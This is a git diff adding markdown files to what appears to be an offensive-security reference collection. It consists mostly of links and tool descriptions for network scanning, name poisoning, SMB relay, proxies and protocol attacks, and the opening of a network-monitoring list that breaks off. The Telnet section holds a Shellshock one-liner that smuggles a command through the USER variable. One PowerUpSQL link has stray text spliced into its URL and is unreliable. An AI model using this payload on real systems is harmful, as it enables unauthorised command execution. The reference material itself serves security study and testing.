+    Compromising the Windows Enterprise via Windows Update'
+
+#### Modbus
+
+* See 'Modbus' in 'SCADA/Heavy Machinery'
+* [Modbus interface tutorial](https://www.lammertbies.nl/comm/info/modbus.html)
+
+#### MQTT
+
+* [MQTT](http://mqtt.org/)
+
+  * MQTT is a machine-to-machine (M2M)/"Internet of Things" connectivity
+    protocol. It was designed as an extremely lightweight publish/subscribe
+    messaging transport.
+
+* [MQTT - Wikipedia](https://en.wikipedia.org/wiki/MQTT)
+* [MQTT 101 – How to Get Started with the lightweight IoT Protocol](https://www.hivemq.com/blog/how-to-get-started-with-mqtt)
+
+#### Netbios
+
+* [NetBIOS - Wikipedia](https://en.wikipedia.org/wiki/NetBIOS)
+* [NetBIOS - rhyshaden.com](http://www.rhyshaden.com/netbios.htm)
+* [Local Network Attacks: LLMNR and NBT-NS Poisoning](https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning)
+* [NbtScan](http://www.unixwiz.net/tools/nbtscan.html)
+
+  * This is a command-line tool that scans for open NETBIOS nameservers on a
+    local or remote TCP/IP network, and this is a first step in finding of open
+    shares. It is based on the functionality of the standard Windows tool
+    nbtstat, but it operates on a range of addresses instead of just one. I
+    wrote this tool because the existing tools either didn't do what I wanted or
+    ran only on the Windows platforms: mine runs on just about everything.
+
+* [Responder](https://github.com/lgandx/Responder)
+
+  * Responder an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific
+    NBT-NS (NetBIOS Name Service) queries based on their name suffix (see:
+    http://support.microsoft.com/kb/163409). By default, the tool will only
+    answer to File Server Service request, which is for SMB. The concept behind
+    this is to target our answers, and be stealthier on the network. This also
+    helps to ensure that we don't break legitimate NBT-NS behavior. You can set
+    the -r option via command line if you want to answer to the Workstation
+    Service request name suffix.
+
+#### Network Host Discovery/Service Discovery:
+
+* Informational
+
+* [Nmap you’re doing it wrong - sneakerhax](https://sneakerhax.com/nmap-yourre-doing-it-wrong/)
+* [Recon at scale - sneakerhax](https://sneakerhax.com/recon-at-scale/)
+* [Nmap Reference Guide](https://nmap.org/book/man.html)
+* [Security.StackExchange Answer detailing Nmap Scanning tips and tactics - very good](https://security.stackexchange.com/questions/373/open-source-penetration-test-automation/82529#82529)
+* [Massively Scaling your Scanning - SANS](https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning)
+* [Mass Scanning the Internet: Tips, Tricks, Results - DEF CON 22 - Graham, Mcmillan, and Tentler](https://www.youtube.com/watch?v=nX9JXI4l3-E)
+* Firewall
+* [Firewalk](http://packetfactory.openwall.net/projects/firewalk/)
+
+  * Firewalk is an active reconnaissance network security tool that attempts to
+    determine what layer 4 protocols a given IP forwarding device will pass.
+    Firewalk works by sending out TCP or UDP packets with a TTL one greater than
+    the targeted gateway. If the gateway allows the traffic, it will forward the
+    packets to the next hop where they will expire and elicit an
+    ICMP_TIME_EXCEEDED message. If the gateway hostdoes not allow the traffic,
+    it will likely drop the packets on the floor and we will see no response. To
+    get the correct IP TTL that will result in expired packets one beyond the
+    gateway we need to ramp up hop-counts. We do this in the same manner that
+    traceroute works. Once we have the gateway hopcount (at that point the scan
+    is said to be `bound`) we can begin our scan.
+
+* General
+
+* [Nmap](http://nmap.org/)
+
+  * Nmap ("Network Mapper") is a free and open source (license) utility for
+    network discovery and security auditing. Many systems and network
+    administrators also find it useful for tasks such as network inventory,
+    managing service upgrade schedules, and monitoring host or service uptime.
+    Nmap uses raw IP packets in novel ways to determine what hosts are available
+    on the network, what services (application name and version) those hosts are
+    offering, what operating systems (and OS versions) they are running, what
+    type of packet filters/firewalls are in use, and dozens of other
+    characteristics. It was designed to rapidly scan large networks, but works
+    fine against single hosts. Nmap runs on all major computer operating
+    systems, and official binary packages are available for Linux, Windows, and
+    Mac OS X. In addition to the classic command-line Nmap executable, the Nmap
+    suite includes an advanced GUI and results viewer (Zenmap), a flexible data
+    transfer, redirection, and debugging tool (Ncat), a utility for comparing
+    scan results (Ndiff), and a packet generation and response analysis tool
+    (Nping).
+
+* [NMAP - Port-Scanning: A Practical Approach Modified for better](https://www.exploit-db.com/papers/35425/)
+* [NSEInfo](https://github.com/christophetd/nmap-nse-info/blob/master/README.md)
+
+  * NSEInfo is a tool to interactively search through nmap's NSE scripts.
+
+* [Nmap (XML) Parser documentation](https://nmap-parser.readthedocs.io/en/latest/)
+* [Scanning Effectively Through a SOCKS Pivot with Nmap and Proxychains](https://cybersyndicates.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/)
+  * [Script](https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/Proxychains-Nmap.py)
+  * [ms15-034.nse Script](https://github.com/pr4jwal/quick-scripts/blob/master/ms15-034.nse)
+* [Angry IP Scanner](http://angryip.org/)
+
+  * Angry IP Scanner (or simply ipscan) is an open-source and cross-platform
+    network scanner designed to be fast and simple to use. It scans IP addresses
+    and ports as well as has many other features.
+
+* [ScanCannon](https://github.com/johnnyxmas/ScanCannon)
+
+* The speed of masscan with the reliability and detailed enumeration of nmap!
+
+* [UnicornScan](http://www.unicornscan.org/)
+
+  * Unicornscan is a new information gathering and correlation engine built for
+    and by members of the security research and testing communities. It was
+    designed to provide an engine that is Scalable, Accurate, Flexible, and
+    Efficient. It is released for the community to use under the terms of the
+    GPL license.
+  * Editor note: Use this to mass scan networks. It-s faster than nmap at
+    scanning large host lists and allows you to see live hosts quickly.
+
+* [hping](http://www.hping.org/)
+
+  * hping is a command-line oriented TCP/IP packet assembler/analyzer. The
+    interface is inspired to the ping(8) unix command, but hping isn't only able
+    to send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols,
+    has a traceroute mode, the ability to send files between a covered channel,
+    and many other features.
+
+* [Ever wanted to scan the internet in a few hours?](http://blog.erratasec.com/2013/10/faq-from-where-can-i-scan-internet.html)
+* [Adding your protocol to Masscan](http://blog.erratasec.com/2014/11/adding-protocols-to-masscan.html)
+* [Consul](https://github.com/hashicorp/consul)
+
+  * Consul is a tool for service discovery and configuration. Consul is
+    distributed, highly available, and extremely scalable.
+
+* [gateway-finder](https://github.com/pentestmonkey/gateway-finder)
+
+  * Gateway-finder is a scapy script that will help you determine which of the
+    systems on the local LAN has IP forwarding enabled and which can reach the
+    Internet.
+
+* Tor
+
+* [exitmap](https://github.com/NullHypothesis/exitmap)
+
+  * A fast and modular scanner for Tor exit relays.
+    http://www.cs.kau.se/philwint/spoiled_onions/
+
+* [OnionScan](https://github.com/s-rah/onionscan)
+* [What OnionScan Scans for](https://github.com/s-rah/onionscan/blob/master/doc/what-is-scanned-for.md)
+
+* VHost Scanning
+
+* [hostmap](https://github.com/jekil/hostmap)
+
+  * hostmap is a free, automatic, hostnames and virtual hosts discovery tool
+    written in Ruby by Alessandro Tanasi
+
+* Cloudflare
+
+* [CloudFail](https://github.com/m0rtem/CloudFail)
+
+  * CloudFail is a tactical reconnaissance tool which aims to gather enough
+    information about a target protected by CloudFlare in the hopes of
+    discovering the location of the server.
+
+* [HatCloud](https://github.com/HatBashBR/HatCloud)
+
+  * HatCloud build in Ruby. It makes bypass in CloudFlare for discover real IP.
+    This can be useful if you need test your server and website. Testing your
+    protection against Ddos (Denial of Service) or Dos. CloudFlare is services
+    and distributed domain name server services, sitting between the visitor and
+    the Cloudflare user's hosting provider, acting as a reverse proxy for
+    websites. Your network protects, speeds up and improves availability for a
+    website or the mobile application with a DNS change.
+
+* Cisco
+
+* [CiscoRouter - tool](https://github.com/ajohnston9/ciscorouter)
+
+  * CiscoRouter is a tool for scanning Cisco-based routers over SSH. Rules can
+    be created using accompanying CiscoRule application (see this repo) and
+    stored in the "rules" directory.
+
+* [discover - Kali Scripts](https://github.com/leebaird/discover)
+
+  * For use with Kali Linux - custom bash scripts used to automate various
+    portions of a pentest.
+
+* [changeme - A default credential scanner.](https://github.com/ztgrace/changeme)
+
+  * changeme picks up where commercial scanners leave off. It focuses on
+    detecting default and backdoor credentials and not necessarily common
+    credentials. It's default mode is to scan HTTP default credentials, but has
+    support for other credentials. changeme is designed to be simple to add new
+    credentials without having to write any code or modules. changeme keeps
+    credential data separate from code. All credentials are stored in yaml files
+    so they can be both easily read by humans and processed by changeme.
+    Credential files can be created by using the ./changeme.py --mkcred tool and
+    answering a few questions. changeme supports the http/https, mssql, mysql,
+    postgres, ssh, ssh w/key, snmp, mongodb and ftp protocols. Use ./changeme.py
+    --dump to output all of the currently available credentials.
+
+* [scanless](https://github.com/vesche/scanless)
+
+  * Command-line utility for using websites that can perform port scans on your
+    behalf. Useful for early stages of a penetration test or if you'd like to
+    run a port scan on a host and have it not come from your IP address.
+
+* [device-pharmer](https://github.com/DanMcInerney/device-pharmer)
+
+  * Opens 1K+ IPs or Shodan search results and attempts to login
+
+* [Sn1per](https://github.com/1N3/Sn1per)
+
+  * Sn1per is an automated scanner that can be used during a penetration test to
+    enumerate and scan for vulnerabilities.
+
+### NFS
+
+* [Network File System](https://en.wikipedia.org/wiki/Network_File_System)
+* [NFS - ArchWiki](https://wiki.archlinux.org/index.php/NFS)
+* [Linux NFS Documentation](http://nfs.sourceforge.net/)
+
+  * This document provides an introduction to NFS as implemented in the Linux
+    kernel. It links to developers' sites, mailing list archives, and relevant
+    RFCs, and provides guidance for quickly configuring and getting started with
+    NFS on Linux. A Frequently Asked Questions section is also included. This
+    document assumes the reader is already familiar with generic NFS
+    terminology.
+
+* [NfSpy](https://github.com/bonsaiviking/NfSpy)
+
+  * NfSpy is a Python library for automating the falsification of NFS
+    credentials when mounting an NFS share.
+
+* [Using nfsshell to compromise older environments](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/)
+* [Abusing Hardlinks Via NFS](http://pentestmonkey.net/blog/nfs-hardlink)
+* [Exploiting Network File System, (NFS), shares - vulnerabilityassessment.co.uk](http://www.vulnerabilityassessment.co.uk/nfs.htm)
+* [NFS: Network File System Protocol Specification - rfc1094](https://tools.ietf.org/html/rfc1094)
+
+### Pivoting
+
+* Really, look at the Pivoting section in Post Exploitation/Privilege Escalation
+
+#### Proxies
+
+* [Mallory](https://bitbucket.org/IntrepidusGroup/mallory)
+
+  * Mallory is an extensible TCP/UDP man in the middle proxy that is designed to
+    be run as a gateway. Unlike other tools of its kind, Mallory supports
+    modifying non-standard protocols on the fly.
+
+* [SSLStrip](http://www.thoughtcrime.org/software/sslstrip/)
+
+  * This tool provides a demonstration of the HTTPS stripping attacks that I
+    presented at Black Hat DC 2009. It will transparently hijack HTTP traffic on
+    a network, watch for HTTPS links and redirects, then map those links into
+    either look-alike HTTP links or homograph-similar HTTPS links. It also
+    supports modes for supplying a favicon which looks like a lock icon,
+    selective logging, and session denial.
+
+* [Echo Mirage](http://www.wildcroftsecurity.com/echo-mirage)
+
+  * Echo Mirage is a generic network proxy. It uses DLL injection and function
+    hooking techniques to redirect network related function calls so that data
+    transmitted and received by local applications can be observed and modified.
+    Windows encryption and OpenSSL functions are also hooked so that plain text
+    of data being sent and received over an encrypted session is also available.
+    Traffic can be intercepted in real-time, or manipulated with regular
+    expressions and a number of action directives
+
+* [Burp Proxy](http://portswigger.net/burp/proxy.html)
+
+  * Burp Proxy is an intercepting proxy server for security testing of web
+    applications. It operates as a man-in-the-middle between your browser and
+    the target application
+
+* [Charles Proxy](https://www.charlesproxy.com/)
+
+  * Charles is an HTTP proxy / HTTP monitor / Reverse Proxy that enables a
+    developer to view all of the HTTP and SSL / HTTPS traffic between their
+    machine and the Internet. This includes requests, responses and the HTTP
+    headers (which contain the cookies and caching information).
+
+* [OWASP Zed Attack Proxy](http://www.zaproxy.org/)
+* [Zed Attack Proxy (ZAP) Community Scripts](https://github.com/zaproxy/community-scripts)
+
+  * A collection of ZAP scripts provided by the community - pull requests very
+    welcome!
+
+* [Phreebird](http://dankaminsky.com/phreebird/)
+
+  * Phreebird is a DNSSEC proxy that operates in front of an existing DNS server
+    (such as BIND, Unbound, PowerDNS, Microsoft DNS, or QIP) and supplements its
+    records with DNSSEC responses. Features of Phreebird include automatic key
+    generation, realtime record signing, support for arbitrary responses, zero
+    configuration, NSEC3 -White Lies-, caching and rate limiting to deter DoS
+    attacks, and experimental support for both Coarse Time over DNS and HTTP
+    Virtual Channels. The suite also contains a large amount of sample code,
+    including support for federated identity over OpenSSH. Finally, -Phreeload-
+    enhances existing OpenSSL applications with DNSSEC support.
+
+* [TCP Catcher](http://www.tcpcatcher.org/)
+
+  * TcpCatcher is a free TCP, SOCKS, HTTP and HTTPS proxy monitor server
+    software.
+
+* [DNS Chef](https://github.com/amckenna/DNSChef)
+
+  * This is a fork of the DNSChef project v0.2.1 hosted at:
+    http://thesprawl.org/projects/dnschef/
+
+* [Squid Proxy](http://www.squid-cache.org/)
+
+  * Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more.
+    It reduces bandwidth and improves response times by caching and reusing
+    frequently-requested web pages. Squid has extensive access controls and
+    makes a great server accelerator. It runs on most available operating
+    systems, including Windows and is licensed under the GNU GPL.
+
+* [SharpSocks](https://github.com/nettitude/SharpSocks)
+
+  * Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via
+    PowerShell
+
+* [ssf - Secure Socket Funneling](https://github.com/securesocketfunneling/ssf)
+
+  * Network tool and toolkit. It provides simple and efficient ways to forward
+    data from multiple sockets (TCP or UDP) through a single secure TLS tunnel
+    to a remote computer. SSF is cross platform (Windows, Linux, OSX) and comes
+    as standalone executables.
+
+* [PowerCat](https://github.com/secabstraction/PowerCat)
+
+  * A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
+
+### PXE
+
+* [Use DHCP to detect UEFI or Legacy BIOS system and PXE boot to SCCM](http://www.itfaq.dk/2016/07/27/use-dhcp-to-detect-uefi-or-legacy-bios-system-and-pxe-boot-to-sccm/)
+
+### RabbitMQ/ZeroMQ
+
+* [Enteletaor](https://github.com/cr0hn/enteletaor)
+
+  * Message Queue & Broker Injection tool that implements attacks to Redis,
+    RabbitMQ and ZeroMQ.
+
+* [RabbitMQ - Wikipedia](https://en.wikipedia.org/wiki/RabbitMQ)
+
+### Software Defined Networking (SDN)
+
+* [DELTA: SDN SECURITY EVALUATION FRAMEWORK](https://github.com/OpenNetworkingFoundation/DELTA)
+
+  * DELTA is a penetration testing framework that regenerates known attack
+    scenarios for diverse test cases. This framework also provides the
+    capability of discovering unknown security problems in SDN by employing a
+    fuzzing technique.
+
+#### SIP/VOIP:
+
+* [A Hitchhiker's Guide to the Session Initiation Protocol (SIP)](https://tools.ietf.org/html/rfc5411)
+* [Session Initiation Protocol - Wikipedia](https://en.wikipedia.org/wiki/Session_Initiation_Protocol)
+* [sipvicious](https://github.com/EnableSecurity/sipvicious)
+* [bluebox-ng](https://github.com/jesusprubio/bluebox-ng)
+
+  * Pentesting framework using Node.js powers, focused in VoIP.
+
+#### SMB
+
+* [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
+* [Microsoft SMB Protocol and CIFS Protocol Overview](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa365233(v=vs.85).aspx>)
+* [WinNT/Win95 Automatic Authentication Vulnerability (IE Bug #4)](http://insecure.org/sploits/winnt.automatic.authentication.html)
+* [SMB: Sharing More than Just Your Files - BH USA 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Brossard-SMBv2-Sharing-More-Than-Just-Your-Files.pdf)
+* [Stealing Windows Credentials Using Google Chrome](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)
+* [SMB Relay Demystified and NTLMv2 Pwnage with Python](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)
+* [Responder](https://github.com/lgandx/Responder)
+
+  * Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in
+    HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting
+    NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.
+
+* [SPEAR: Redirect to SMB](https://blog.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf)
+* [Resurrection of the Living Dead: The “Redirect to SMB” Vulnerability](http://blog.trendmicro.com/trendlabs-security-intelligence/resurrection-of-the-living-dead-the-redirect-to-smb-vulnerability/)
+
+#### SMTP:
+
+* [RFC 821 - SIMPLE MAIL TRANSFER PROTOCOL](https://tools.ietf.org/html/rfc821)
+* [RFC 5321 - Simple Mail Transfer Protocol](https://tools.ietf.org/html/rfc5321)
+* [Simple Mail Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol)
+* [Simple Mail Transfer Protocol - msdn](https://msdn.microsoft.com/en-us/library/aa480435.aspx)
+* [SMTP User Enumeration](https://pentestlab.blog/2012/11/20/smtp-user-enumeration/)
+* [Swaks - Swiss Army Knife for SMTP](http://www.jetmore.org/john/code/swaks/)
+
+#### SNMP:
+
+* [Simple Network Management Protocol - Wikipedia](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol)
+* [SNMP Attacks and Security - Mauno Pihelgas](https://home.cyber.ee/~ahtbu/CDS2011/MaunoPihelgasSlides.pdf)
+* [SNMP REFLECTION/AMPLIFICATION](https://www.incapsula.com/ddos/attack-glossary/snmp-reflection.html)\*
+* [Onesixtyone](http://www.phreedom.org/software/onesixtyone/)
+
+  * onesixtyone is an SNMP scanner which utilizes a sweep technique to achieve
+    very high performance. It can scan an entire class B network in under 13
+    minutes. It can be used to discover devices responding to well-known
+    community names or to mount a dictionary attack against one or more SNMP
+    devices.
+
+* [SNMPWALK](http://net-snmp.sourceforge.net/docs/man/snmpwalk.html)
+
+  * snmpwalk - retrieve a subtree of management values using SNMP GETNEXT
+    requests
+
+* [Simple Network Management Pwnd](http://www.irongeek.com/i.php?page=videos/derbycon4/t221-simple-network-management-pwnd-deral-heiland-and-matthew-kienow)
+* [Cisc0wn - Cisco SNMP Script](https://github.com/nccgroup/cisco-SNMP-enumeration)
+
+  * Automated Cisco SNMP Enumeration, Brute Force, Configuration Download and
+    Password Cracking
+
+#### SQL:
+
+* See 'SQL' in the Web Section.
+
+* [SQLMap](https://github.com/sqlmapproject/sqlmap)
+
+  * sqlmap is an open source penetration testing tool that automates the process
+    of detecting and exploiting SQL injection flaws and taking over of database
+    servers. It comes with a powerful detection engine, many niche features for
+    the ultimate penetration tester and a broad range of switches lasting from
+    database fingerprinting, over data fetching from the database, to accessing
+    the underlying file system and executing commands on the operating system
+    via out-of-band connections.
+
+* [PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server](https://github.com/NetSPI/PowerUpSQL)
+
+  * The PowerUpSQL module includes functions that support SQL Server discovery,
+    auditing for common weak configurations, and privilege escalation on scale.
+    It is intended to be used during internal penetration tests and red team
+    engagements. However, PowerUpSQL also includes many functions that could be
+    used by administrators to quickly inventory the SQL Servers in their ADS
+    domain.
+  * [Documentation](https TLS/SSL Vulnerabilities
+    ://github.com/NetSPI/PowerUpSQL/wiki)
+
+* [Overview of PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/Overview-of-PowerUpSQL)
+* [Using Metasploit to Find Vulnerable MSSQL Systems](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)
+* [nmap ms-sql-info.nse](https://nmap.org/nsedoc/scripts/ms-sql-info.html)
+
+#### SSH:
+
+* [The Secure Shell (SSH) Transport Layer Protocol](https://tools.ietf.org/html/rfc4253)
+* [OpenSSH Specs](https://www.openssh.com/specs.html)
+* [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
+* [The SSH Protocol - Snailbook](http://www.snailbook.com/protocols.html)
+* [SSH for Fun and Profit](https://karla.io/2016/04/30/ssh-for-fun-and-profit.html)
+* [OpenSSH User Enumeration Time-Based Attack](http://seclists.org/fulldisclosure/2013/Jul/88)
+* [ssh-audit](https://github.com/arthepsy/ssh-audit)
+
+  * SSH server auditing (banner, key exchange, encryption, mac, compression,
+    compatibility, security, etc)
+
+#### SSL/TLS
+
+* RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2
+* [Transport Layer Security - Wikipedia](https://en.wikipedia.org/wiki/Transport_Layer_Security)
+  [TLS/SSL Vulnerabilities](https://www.gracefulsecurity.com/tls-ssl-vulnerabilities/)
+* [SSL/TLS and PKI History](https://www.feistyduck.com/ssl-tls-and-pki-history/)
+
+  * A comprehensive history of the most important events that shaped the SSL/TLS
+    and PKI ecosystem. Based on Bulletproof SSL and TLS, by Ivan Ristic.
+
+* [testssl.sh](https://github.com/drwetter/testssl.sh)
+
+  * testssl.sh is a free command line tool which checks a server's service on
+    any port for the support of TLS/SSL ciphers, protocols as well as some
+    cryptographic flaws.
+
+* [SSL & TLS Penetration Testing [Definitive Guide]](https://www.aptive.co.uk/blog/tls-ssl-security-testing/)
+
+#### STP:
+
+* [Spanning Tree Protocol - Wikipedia](https://en.wikipedia.org/wiki/Spanning_Tree_Protocol)
+* [STP MiTM Attack and L2 Mitigation Techniques on the Cisco Catalyst 6500 ](http://www.ndm.net/ips/pdf/cisco/Catalyst-6500/white_paper_c11_605972.pdf)
+* [Spanning Tree Protocol (STP) Introduction](http://www.dummies.com/programming/networking/cisco/spanning-tree-protocol-stp-introduction/)
+
+#### Telnet
+
+* [Shellshock and the Telnet USER Variable](https://digi.ninja/blog/telnet_shellshock.php) \*
+  `telnet 10.1.1.1 -l "() { :;}; /usr/bin/id"`
+
+### TR-069
+
+* [TR-069 - Wikipedia](https://en.wikipedia.org/wiki/TR-069)
+* [Too Many Cooks; Exploiting the Internet of Tr-069](http://mis.fortunecook.ie/)
+* [TR-069 – A Crash Course University of New Hampshire Interoperability Laboratory 2009](https://www.iol.unh.edu/sites/default/files/knowledgebase/hnc/TR-069_Crash_Course.pdf)
+
+### UPnP
+
+* [Universal Plug and Play (UPnP) Internet Gateway Device - Port Control Protocol Interworking Function (IGD-PCP IWF)](https://tools.ietf.org/html/rfc6970)
+* UPnP™ Device Architecture 1.1 - upnp.org
+* [UPNP Hacks](http://www.upnp-hacks.org/igd.html)
+* [Universal Plug and Play - Wikipedia](https://en.wikipedia.org/wiki/Universal_Plug_and_Play)
+* [Ufuzz](https://github.com/phikshun/ufuzz)
+
+  * UFuzz, or Universal Plug and Fuzz, is an automatic UPnP fuzzing tool. It
+    will enumerate all UPnP endpoints on the network, find the available
+    services and fuzz them. It also has the capability to fuzz HTTP using Burp
+    proxy logs.
+
+* [miranda-upnp](https://github.com/0x90/miranda-upnp)
+* [UPnP Pentest Toolkit](https://github.com/nccgroup/UPnP-Pentest-Toolkit)
+
+#### VLANs
+
+* [Virtual LAN](https://en.wikipedia.org/wiki/Virtual_LAN)
+* [Virtual Local Area Networks](https://www.cse.wustl.edu/~jain/cis788-97/ftp/virtual_lans/index.html)
+* [VLAN hopping, ARP Poisoning and Man-In-The-Middle Attacks in Virtualized Environments - Ronny L. Bull - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/110-vlan-hopping-arp-poisoning-and-man-in-the-middle-attacks-in-virtualized-environments-dr-ronny-l-bull)
+
+  * Cloud service providers and data centers offer their customers the ability
+    to deploy virtual machines within multi-tenant environments. These virtual
+    machines are typically connected to the physical network via a virtualized
+    network configuration. This could be as simple as a bridged interface to
+    each virtual machine or as complicated as a virtual switch providing more
+    robust networking features such as VLANs, QoS, and monitoring. In this talk
+    I will demonstrate the effects of VLAN hopping, ARP poisoning and
+    Man-in-the-Middle attacks across every major hypervisor platform, including
+    results of attacks originating from the physically connected network as well
+    as within the virtual networks themselves. Each attack category that is
+    discussed will be accompanied by a detailed proof of concept demonstration
+    of the attack.
+
+#### Web:
+
+* [WPScan](https://github.com/wpscanteam/wpscan)
+
+  * WPScan is a black box WordPress vulnerability scanner.
+
+* [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
+
+  * WhatWeb identifies websites. Its goal is to answer the question, "What is
+    that Website?". WhatWeb recognises web technologies including content
+    management systems (CMS), blogging platforms, statistic/analytics packages,
+    JavaScript libraries, web servers, and embedded devices. WhatWeb has over
+    1500 plugins, each to recognise something different. WhatWeb also identifies
+    version numbers, email addresses, account IDs, web framework modules, SQL
+    errors, and more.
+
+* [webDisco](https://github.com/joeybelans/webDisco)
+
+  * Web discovery tool to capture screenshots from a list of hosts & vhosts.
+    Requests are made via IP address and vhosts to determine differences.
+    Additionallty checks for common administrative interfaces and web server
+    misconfigurations.
+
+* [w3af](https://github.com/andresriancho/w3af)
+
+  * w3af: web application attack and audit framework, the open source web
+    vulnerability scanner.
+
+* [PowerWebShot](https://github.com/dafthack/PowerWebShot)
+
+  * A PowerShell tool for taking screenshots of multiple web servers quickly.
+
+* [Event Tracing for Windows and Network Monitor](http://blogs.technet.com/b/netmon/archive/2009/05/13/event-tracing-for-windows-and-network-monitor.aspx)
+
+  * "Event Tracing for Windows, (ETW), has been around for quite a while now as
+    it was introduced in Windows 2000. It's basically instrumented logging that
+    describes what a component is doing. Conceptually, it-s something like the
+    proverbial printf("here1") concept used by programmers, but it is present in
+    retail builds. When you enable logging in a component the result is an ETL
+    (Event Trace Log) file. What-s new is that that Network Monitor can read any
+    ETL file. And with the supplied parsers many network oriented ETW providers
+    can be decoded."
+
+### Other
+
+* [Home Network Administration Protocol - Wikipedia](https://en.wikipedia.org/wiki/Home_Network_Administration_Protocol)
+
+  * Home Network Administration Protocol (HNAP) is a proprietary network
+    protocol invented[1] by Pure Networks, Inc. and acquired by Cisco Systems
+    which allows identification, configuration, and management of network
+    devices. HNAP is based on SOAP.[2]
+
+* [More on HNAP - What is it, How to Use it,How to Find it](https://isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648)
+* [HNAP - Router Security](https://www.routersecurity.org/hnap.php)
+* [More on HNAP - What is it, How to Use it, How to Find it](https://isc.sans.edu/forums/diary/More+on+HNAP+What+is+it+How+to+Use+it+How+to+Find+it/17648/)
+* [Home Network Administration Protocol (HNAP) Whitepaper](https://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf)
+* [Hacking D-Link Routers With HNAP](https://regmedia.co.uk/2016/11/07/dlink_hnap_captcha.pdf)
+
+#### MISC:
+
+* [t50 - the fastest packet injector.](https://github.com/fredericopissarra/t50)
+
+  * T50 was designed to perform -Stress Testing- on a variety of infra-structure
+
+  network devices (Version 2.45), using widely implemented protocols, and after
+  some requests it was was re-designed to extend the tests (as of Version 5.3),
+  covering some regular protocols (ICMP, TCP and UDP), some infra-structure
+  specific protocols (GRE, IPSec and RSVP), and some routing protocols (RIP,
+  EIGRP and OSPF).
+
+* [C3CM: Defeating the Command - Control - and Communications of Digital Assailants](http://www.irongeek.com/i.php?page=videos/derbycon4/t206-c3cm-defeating-the-command-control-and-communications-of-digital-assailants-russ-mcree)
+
+  * C3CM: the acronym for command- control- and communi - cations
+    countermeasures. Ripe for use in the information security realm, C3CM takes
+    us past C2 analysis and to the next level. Initially, C3CM was most often
+    intended to wreck the command and control of enemy air defense networks, a
+    very specific military mission. We-ll apply that mindset in the context of
+    combating bots and other evil. Our version of C3CM therefore is to identify,
+    interrupt, and counter the command, control, and communications capabilities
+    of our digital assailants. The three phases of C3CM will utilize: Nfsight
+    with Nfdump, Nfsen, and fprobe to conduct our identification phase, Bro with
+    Logstash and Kibana for the interruption phase, and ADHD for the counter
+    phase. Converge these on one useful platform and you too might have a chance
+    deter those who would do you harm. We-ll discuss each of these three phases
+    (identify, interrupt, and counter) with tooling and tactics, complete with
+    demonstrations and methodology attendees can put to use in their
+    environments. Based on the three part ISSA Journal Toolsmith series:
+    http://holisticinfosec.
+    blogspot.com/search?q=c3cm&max-results=20&by-date=true
diff --git a/source/Network-Security-Monitoring-Logging.md b/source/Network-Security-Monitoring-Logging.md
new file mode 100644
index 0000000..2a423d9
--- /dev/null
+++ b/source/Network-Security-Monitoring-Logging.md
@@ -0,0 +1,502 @@
+# Network Security Monitoring
+
+### Cull
+
+* [Presentations/Videos](#videos)
+* [Writeups](#writeups)
+* [Tools](#tools)
+* [IDS/IPS](#ips)
+* [IDS/IPS Monitoring](#monitor)
+* [Logging](#log)
+  * [Linux](#linux)
+  * [Windows](#win)
+* [PCaps/Static Data](#pcap)
+* Making Sense of the Data
+* [Papers](#papers)
+* [Tricks & Tips](#tricks)
+
+##### To Do
+
+* Create incident Response section
+* Break out Threat hunting stuff
+* Break out Logging stuff into "logging" for system specific logging
+
+#### Cull
+
+* [laikaboss](https://github.com/lmco/laikaboss)
+
+* http://www.netfort.com/wp-content/uploads/PDF/WhitePapers/NetFlow-Vs-Packet-Analysis-What-Should-You-Choose.pdf
+
+* [Response Operation Collections Kit Reference Build](https://github.com/rocknsm/rock)
+
+* [Infection Monkey](https://github.com/guardicore/monkey)
+
+  * The Infection Monkey is an open source security tool for testing a data
+    center's resiliency to perimeter breaches and internal server infection. The
+    Monkey uses various methods to self propagate across a data center and
+    reports success to a centralized Command and Control(C&C) server.
+
+* [Hunting Red Team Empire C2 Infrastructure](http://www.chokepoint.net/2017/04/hunting-red-team-empire-c2.html)
+
+* [Get-InjectedThread.ps1](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+
+  * Looks for threads that were created as a result of code injection.
+
+### Presentations/Videos
+
+* [Logging ALL THE THINGS Without All The Cost With Open Source Big Data Tools - DEFCON22 - Zach Fasel](https://www.youtube.com/watch?v=2AAnVeIwXBo)
+
+  * Many struggle in their job with the decision of what events to log in battle
+    against costly increases to their licensing of a commercial SIEM or other
+    logging solution. Leveraging the open source solutions used for "big-data"
+    that have been proven by many can help build a scalable, reliable, and
+    hackable event logging and security intelligence system to address security
+    and (_cringe_) compliance requirements. We’ll walk through the various
+    components and simple steps to building your own logging environment that
